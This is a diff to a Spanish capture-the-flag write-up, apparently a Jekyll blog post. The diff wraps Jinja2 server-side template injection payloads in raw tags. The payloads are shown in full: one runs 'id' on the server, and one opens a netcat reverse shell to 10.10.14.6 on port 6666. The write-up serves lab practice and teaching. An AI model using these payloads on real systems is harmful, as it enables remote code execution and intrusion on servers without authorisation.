@@ -221,7 +221,7 @@ curl -X POST -H "Content-Type: application/json" -d '{"siteurl": "{{ 7 * 7 }}"}'
 Vemos que se acontece el ataque, nos pasamos la petición a burpsuite con `-x http://127.0.0.1:8080` y ejecutaremos un RCE
 
 ```
-"siteurl"="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"
+"siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}{% endraw %}"
 ```
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105202455.png" | relative_url }})
@@ -230,7 +230,7 @@ Vemos que se acontece el ataque, nos pasamos la petición a burpsuite con `-x ht
 Nos mandaremos una reverse shell
 
 ```
-"siteurl"="{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/bin/nc 10.10.14.6 6666 -e /bin/bash').read() }}"
+"siteurl"="{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/usr/bin/nc 10.10.14.6 6666 -e /bin/bash').read() }}{% endraw %}"
 ```
 
 ![]({{ "/assets/images/flustered/Pasted image 20251105202628.png" | relative_url }})
